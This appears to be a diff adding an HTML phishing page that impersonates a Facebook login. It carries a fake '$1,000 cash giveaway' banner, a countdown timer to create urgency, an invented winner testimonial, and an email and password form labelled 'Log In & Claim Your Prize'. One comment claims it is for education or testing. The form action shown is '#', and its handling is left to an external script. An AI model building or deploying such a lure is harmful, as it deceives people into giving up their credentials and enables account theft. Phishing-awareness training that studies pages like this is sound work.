@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login - Win $1,000 Cash Prize!</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="custom.css">
+    <style>
+        .prize-banner {
+            background-color: #ffeb3b;
+            color: #d32f2f;
+            text-align: center;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            animation: pulse 1.5s infinite;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .countdown {
+            background-color: #d32f2f;
+            color: white;
+            font-size: 16px;
+            padding: 5px 10px;
+            border-radius: 20px;
+            margin-top: 10px;
+            display: inline-block;
+        }
+        
+        .prize-details {
+            background-color: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: left;
+        }
+        
+        .prize-details h3 {
+            color: #d32f2f;
+            margin-top: 0;
+        }
+        
+        .winner-testimonial {
+            display: flex;
+            align-items: center;
+            margin-top: 15px;
+            background-color: #e8f5e9;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        
+        .winner-image {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 10px;
+            object-fit: cover;
+        }
+        
+        .facebook-header h1 {
+            margin-bottom: 5px;
+        }
+        
+        .prize-amount {
+            font-size: 24px;
+            color: #2e7d32;
+        }
+    </style>
+    <!-- Note: This is for educational/testing purposes only -->
+</head>
+<body>
+    <div class="container">
+        <div class="facebook-header">
+            <h1>facebook</h1>
+            <p style="color: #666; margin-top: 0;">Facebook Rewards Program</p>
+        </div>
+        
+        <div class="prize-banner">
+            🎉 CONGRATULATIONS! You've been selected for our $1,000 CASH GIVEAWAY! 🎉
+            <div class="countdown">Offer expires in: <span id="timer">05:00</span></div>
+        </div>
+        
+        <div class="login-container">
+            <div class="form-header">
+                <p>Login to claim your prize</p>
+            </div>
+            <div class="login-form">
+                <form id="loginForm" action="#" method="POST" onsubmit="return validateForm()">
+                    <div class="input-group">
+                        <input type="text" id="email" name="email" placeholder="Email, phone or username" required>
+                        <div class="error-message" id="email-error"></div>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                        <div class="error-message" id="password-error"></div>
+                    </div>
+                    <div class="button-group">
+                        <button type="submit" class="login-button">Log In & Claim Your Prize</button>
+                    </div>
+                    <div class="forgot-password">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                    <div class="divider"></div>
+                    <div class="create-account">
+                        <button type="button" class="create-account-button">Create New Account</button>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="prize-details">
+                <h3>🏆 Facebook Rewards Program</h3>
+                <p>As part of our user appreciation campaign, you've been randomly selected to receive a <span class="prize-amount">$1,000</span> cash prize!</p>
+                <p>Simply log in with your Facebook account to verify your identity and claim your reward. Funds will be transferred to your preferred payment method within 24 hours.</p>
+                
+                <div class="winner-testimonial">
+                    <img src="https://randomuser.me/api/portraits/women/42.jpg" alt="Previous Winner" class="winner-image">
+                    <div>
+                        <p><strong>Sarah J.</strong> from Boston just claimed her $1,000 prize!</p>
+                        <p><small>"I couldn't believe it was real until the money showed up in my account!"</small></p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-footer">
+                <p style="color: #999; font-size: 12px; text-align: center; margin-top: 15px;">Limited time offer. Terms and conditions apply.</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Countdown timer
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                
+                display.textContent = minutes + ":" + seconds;
+                
+                if (--timer < 0) {
+                    timer = 0; // Stop at 00:00
+                }
+            }, 1000);
+        }
+        
+        window.onload = function () {
+            const fiveMinutes = 60 * 5;
+            const display = document.querySelector('#timer');
+            startTimer(fiveMinutes, display);
+        };
+    </script>
+    <script src="script.js"></script>
+</body>
+</html> 
